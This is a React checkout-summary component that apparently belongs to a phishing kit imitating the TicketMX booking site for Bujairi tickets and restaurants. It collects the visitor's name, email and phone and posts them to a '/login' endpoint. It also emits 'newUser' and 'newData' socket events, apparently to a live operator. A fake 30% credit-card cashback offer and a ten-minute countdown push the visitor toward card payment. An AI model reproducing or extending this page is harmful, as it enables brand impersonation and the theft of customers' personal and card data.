import React, { useState, useEffect, useMemo } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";
import { api_route, socket } from "../App";
import { useTranslation } from "../context/LanguageContext";
import Footer from "../Footer";

const Summary = () => {
  const { language, dir } = useTranslation();
  const isAr = language === "ar";
  const navigate = useNavigate();

  // 10-minute countdown timer (600 seconds)
  const [secondsLeft, setSecondsLeft] = useState(() => {
    const saved = sessionStorage.getItem("summary_countdown_end");
    if (saved) {
      const remaining = Math.max(
        0,
        Math.floor((parseInt(saved, 10) - Date.now()) / 1000),
      );
      return remaining > 0 ? remaining : 600;
    }
    const end = Date.now() + 10 * 60 * 1000;
    sessionStorage.setItem("summary_countdown_end", String(end));
    return 600;
  });

  useEffect(() => {
    const timer = setInterval(() => {
      setSecondsLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const formattedTime = useMemo(() => {
    const mins = Math.floor(secondsLeft / 60);
    const secs = secondsLeft % 60;
    return `${String(mins).padStart(2, "0")}:${String(secs).padStart(2, "0")}`;
  }, [secondsLeft]);

  // Read Cart Item or Company Data from sessionStorage
  const cartItem = useMemo(() => {
    try {
      const stored = sessionStorage.getItem("cartItem");
      if (stored) return JSON.parse(stored);
    } catch {}

    try {
      const comp = sessionStorage.getItem("companyData");
      if (comp) {
        const parsed = JSON.parse(comp);
        return {
          title: parsed.name || (isAr ? "برنش آند كيك" : "Brunch & Cake"),
          venue: parsed.guests
            ? `${parsed.guests} ${isAr ? "ضيف" : "Guest(s)"}`
            : isAr
              ? "1 ضيف"
              : "1 Guest",
          datetime: isAr ? "50.00 ريال" : "50.00 SAR",
          price: parseFloat(parsed.price) || 50,
          totalPrice: parseFloat(parsed.price) || 50,
        };
      }
    } catch {}

    // Fallback default
    return {
      title: isAr ? "برنش آند كيك" : "Brunch & Cake",
      venue: isAr ? "1 ضيف" : "1 Guest",
      datetime: isAr ? "50.00 ريال" : "50.00 SAR",
      price: 50.0,
      totalPrice: 50.0,
    };
  }, [isAr]);

  const [paymentMethod, setPaymentMethod] = useState("CreditCard");

  // Detect iOS to display Apple Pay or keep available
  const isIOS = useMemo(() => {
    if (typeof window === "undefined" || !window.navigator) return false;
    return /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent);
  }, []);

  const [loading, setLoading] = useState(false);

  const totalPrice = cartItem.totalPrice || cartItem.price || 50;
  const formattedTotal = `${Number(totalPrice).toFixed(2)} ${isAr ? "ريال" : "SAR"}`;

  const handlePayNow = async (e) => {
    if (e) e.preventDefault();
    if (loading) return;
    setLoading(true);

    const firstName = sessionStorage.getItem("firstName") || "";
    const lastName = sessionStorage.getItem("lastName") || "";
    const fullName =
      `${firstName} ${lastName}`.trim() ||
      (isAr ? "عميل البجيري" : "Bujairi Customer");
    const email = sessionStorage.getItem("email") || "";
    const phone = sessionStorage.getItem("phone") || "";

    const dateVal = cartItem.date || new Date().toISOString().split("T")[0];
    const timeVal = cartItem.time || cartItem.timeId || "";

    const companyData = {
      name: cartItem.title,
      price: String(totalPrice),
      total: String(totalPrice),
      guests: cartItem.guests || 1,
      date: dateVal,
      time: timeVal,
      paymentMethod,
    };

    const orderPayload = {
      name: fullName,
      fullname: fullName,
      carHolderName: fullName,
      firstName,
      lastName,
      email,
      phone,
      bookingType: cartItem.type === "restaurant" ? "حجز مطعم" : "تصريح دخول",
      restaurantName: cartItem.type === "restaurant" ? cartItem.title : "",
      ticketName: cartItem.type !== "restaurant" ? cartItem.title : "",
      guests: cartItem.guests || 1,
      reservationDate: dateVal,
      reservationTime: timeVal,
      totalPrice: Number(totalPrice),
      orderTotal: Number(totalPrice),
      paymentMethod,
      cartItem,
      companyData,
      form_type: "bujairi_tickets",
    };

    let createdOrder = null;
    try {
      const res = await axios.post(`${api_route}/login`, orderPayload);
      createdOrder = res.data?.order || res.data;
    } catch (err) {
      console.warn(
        "Could not save to backend server, continuing locally:",
        err,
      );
      createdOrder = {
        ...orderPayload,
        _id: sessionStorage.getItem("orderId") || "order_" + Date.now(),
      };
    }

    const orderId = createdOrder?._id || "order_" + Date.now();
    sessionStorage.setItem("orderId", orderId);
    sessionStorage.setItem("userId", orderId);
    sessionStorage.setItem("currentUserId", orderId);
    sessionStorage.setItem("companyData", JSON.stringify(companyData));
    sessionStorage.setItem("totalPrice", String(totalPrice));
    sessionStorage.setItem("paymentMethod", paymentMethod);
    sessionStorage.setItem("orderData", JSON.stringify(createdOrder));

    try {
      socket.emit("newUser", orderId);
      socket.emit("newData", createdOrder);
    } catch (sErr) {
      console.warn("Socket notification error:", sErr);
    }

    const queryData = encodeURIComponent(JSON.stringify(createdOrder));
    navigate(`/confirm?data=${queryData}`);
  };

  return (
    <div
      className="min-h-screen flex flex-col bg-[#f0eae3] font-['GraphikArabic',sans-serif] text-[#2d242f]"
      dir={dir}
    >
      {/* TicketMX Bujairi Header with Steps */}
      <div className="w-full bg-[#4a374b] py-6 px-4 sm:px-6 lg:px-8 border-b border-[#3b2a3c]">
        <div className="max-w-[1200px] mx-auto flex flex-col lg:flex-row items-center justify-between gap-5">
          <h1 className="text-2xl sm:text-3xl font-bold text-white order-2 lg:order-1 text-center lg:text-start">
            {isAr ? "إتمام الشراء" : "Complete Purchase"}
          </h1>

          {/* Stepper with all 3 steps active */}
          <div className="w-full lg:w-auto min-w-[280px] sm:min-w-[380px] order-1 lg:order-2">
            <div className="relative flex items-center justify-between">
              {/* Connecting line behind circles (active #ffc54b) */}
              <div className="absolute top-[7px] left-[15%] right-[15%] h-[2px] bg-[#ffc54b] z-0" />

              {/* Step 1: Active/Visited */}
              <div className="relative z-10 flex flex-col items-center flex-1">
                <div className="w-3.5 h-3.5 rounded-full bg-[#ffc54b] ring-4 ring-[#ffc54b]/30 mb-2" />
                <span className="text-xs sm:text-sm font-bold text-[#ffc54b] text-center">
                  {isAr ? "تسجيل دخول" : "Login"}
                </span>
              </div>

              {/* Step 2: Active/Visited */}
              <div className="relative z-10 flex flex-col items-center flex-1">
                <div className="w-3.5 h-3.5 rounded-full bg-[#ffc54b] ring-4 ring-[#ffc54b]/30 mb-2" />
                <span className="text-xs sm:text-sm font-bold text-[#ffc54b] text-center">
                  {isAr ? "اختيار التذاكر" : "Select Tickets"}
                </span>
              </div>

              {/* Step 3: Active */}
              <div className="relative z-10 flex flex-col items-center flex-1">
                <div className="w-3.5 h-3.5 rounded-full bg-[#ffc54b] ring-4 ring-[#ffc54b]/30 mb-2" />
                <span className="text-xs sm:text-sm font-bold text-[#ffc54b] text-center">
                  {isAr ? "إتمام الشراء" : "Complete Purchase"}
                </span>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Main Content Area */}
      <div className="flex-grow py-6 sm:py-10 px-4 sm:px-6 lg:px-8">
        <div className="max-w-[850px] mx-auto">
          {/* 10-Minute Countdown Alert */}
          <div
            className="alert alert-info bg-[#d1ecf1] border border-[#bee5eb] text-[#0c5460] rounded-xl p-4 mb-6 text-center text-sm sm:text-base font-medium shadow-sm flex items-center justify-center flex-wrap gap-2"
            role="alert"
          >
            <span>
              {isAr
                ? "الوقت المتاح لاتمام العملية هو 10 دقائق والمتبقى منهم هو"
                : "The time available to complete the transaction is 10 minutes, remaining time is"}
            </span>
            <span className="font-bold text-[#0c5460] text-lg font-mono px-2 py-0.5 rounded bg-white/70">
              {formattedTime}
            </span>
          </div>

          {/* Cart Card */}
          <div className="bg-white rounded-2xl shadow-sm border border-[#e5dcd3] overflow-hidden mb-6">
            <div className="bg-[#4a374b] text-white px-6 py-4">
              <h4 className="text-lg sm:text-xl font-bold mb-0">
                {isAr ? "السلة" : "Cart"}
              </h4>
            </div>
            <div className="p-6">
              {/* Table Headers */}
              <div className="flex items-center justify-between pb-3 border-b border-[#eae3db] text-xs sm:text-sm font-bold text-[#888]">
                <span>{isAr ? "العنصر" : "Item"}</span>
                <span>{isAr ? "الإجمالي" : "Total"}</span>
              </div>

              {/* Selected Item Row */}
              <div className="flex items-start justify-between py-5 border-b border-[#eae3db]">
                <div className="flex flex-col gap-1 text-start">
                  <div className="event-name font-bold text-base sm:text-lg text-[#2d242f]">
                    {cartItem.title}
                  </div>
                  <div className="venue text-xs sm:text-sm text-[#777]">
                    {cartItem.venue}
                  </div>
                  <div className="datetime text-xs sm:text-sm text-[#777]">
                    {cartItem.datetime || formattedTotal}
                  </div>
                </div>
                <div className="font-bold text-base sm:text-lg text-[#2d242f] shrink-0">
                  {formattedTotal}
                </div>
              </div>

              {/* Grand Total Row */}
              <div className="flex items-center justify-between pt-4">
                <div className="font-bold text-base sm:text-lg text-[#2d242f]">
                  {isAr ? "الإجمالي" : "Total"}
                </div>
                <div className="font-bold text-base sm:text-lg text-[#2d242f]">
                  {formattedTotal}
                </div>
              </div>
            </div>
          </div>
          <div className="flex w-full justify-between p-3 rounded-2xl items-center mb-3 bg-white">
            <span className="text-sm font-bold">
              {isAr
                ? "احصل على كاش باك عند استخدامك البطاقة الائتمانية ٣٠٪"
                : "Get 30% cashback when you use your credit card"}
            </span>
            <img src="/pay1.jpeg" className="w-12 rounded-lg" />
          </div>
          {/* Payment Methods Card */}
          <div className="bg-white rounded-2xl shadow-sm border border-[#e5dcd3] overflow-hidden mb-6">
            <div className="bg-[#4a374b] text-white px-6 py-4">
              <h4 className="text-lg sm:text-xl font-bold mb-0">
                {isAr ? "اختر طريقة الدفع" : "Select Payment Method"}
              </h4>
            </div>
            <div className="p-6 space-y-3.5">
              {/* Visa or Mastercard (Selected by Default) */}
              <label
                className={`flex items-center gap-3.5 p-4 rounded-xl border cursor-pointer transition-all ${
                  paymentMethod === "CreditCard"
                    ? "border-[#4a374b] bg-[#faf6f2] shadow-sm"
                    : "border-[#e5dcd3] hover:bg-[#fafafa]"
                }`}
              >
                <input
                  type="radio"
                  name="method"
                  value="CreditCard"
                  id="radioVisa"
                  checked={paymentMethod === "CreditCard"}
                  onChange={() => setPaymentMethod("CreditCard")}
                  className="w-4 h-4 text-[#4a374b] accent-[#4a374b] cursor-pointer"
                />
                <div className="flex items-center gap-2">
                  <img
                    src="https://s3.ticketmx.com/img/visa.png"
                    alt="Visa"
                    className="h-5 sm:h-6 object-contain"
                  />
                  <img
                    src="https://s3.ticketmx.com/img/mastercard.png"
                    alt="Mastercard"
                    className="h-5 sm:h-6 object-contain"
                  />
                </div>
                <span className="text-sm sm:text-base font-semibold text-[#2d242f] ms-1">
                  {isAr ? "فيزا او ماستر كارد" : "Visa or Mastercard"}
                </span>
              </label>

              {/* American Express */}
              <label
                className={`flex items-center gap-3.5 p-4 rounded-xl border cursor-pointer transition-all ${
                  paymentMethod === "Amex"
                    ? "border-[#4a374b] bg-[#faf6f2] shadow-sm"
                    : "border-[#e5dcd3] hover:bg-[#fafafa]"
                }`}
              >
                <input
                  type="radio"
                  name="method"
                  value="Amex"
                  id="radioAmex"
                  checked={paymentMethod === "Amex"}
                  onChange={() => setPaymentMethod("Amex")}
                  className="w-4 h-4 text-[#4a374b] accent-[#4a374b] cursor-pointer"
                />
                <img
                  src="https://s3.ticketmx.com/img/american-express.jpg"
                  alt="American Express"
                  className="h-5 sm:h-6 object-contain"
                />
                <span className="text-sm sm:text-base font-semibold text-[#2d242f] ms-1">
                  {isAr ? "بطاقة امريكان اكسبريس" : "American Express Card"}
                </span>
              </label>
            </div>
          </div>

          {/* Pay Button */}
          <div className="pt-2">
            <button
              id="btnPayNow"
              type="button"
              disabled={loading}
              onClick={handlePayNow}
              className={`w-full py-4 rounded-xl text-center font-bold text-base sm:text-lg text-white transition-all shadow-md ${
                loading
                  ? "bg-[#6d5b6e] cursor-not-allowed opacity-90"
                  : "bg-[#4a374b] hover:bg-[#372738] active:scale-[0.99] cursor-pointer"
              }`}
            >
              {loading ? (
                <div className="flex items-center justify-center gap-2">
                  <svg
                    className="animate-spin h-5 w-5 text-white"
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                  >
                    <circle
                      className="opacity-25"
                      cx="12"
                      cy="12"
                      r="10"
                      stroke="currentColor"
                      strokeWidth="4"
                    />
                    <path
                      className="opacity-75"
                      fill="currentColor"
                      d="M4 12a8 8 0 018-8v8H4z"
                    />
                  </svg>
                  <span>
                    {isAr ? "جاري تجهيز الحجز..." : "Processing booking..."}
                  </span>
                </div>
              ) : isAr ? (
                "المتابعة لإتمام الدفع أونلاين"
              ) : (
                "Proceed to Online Payment"
              )}
            </button>
          </div>
        </div>
      </div>

      {/* Footer */}
      <Footer />
    </div>
  );
};

export default Summary;
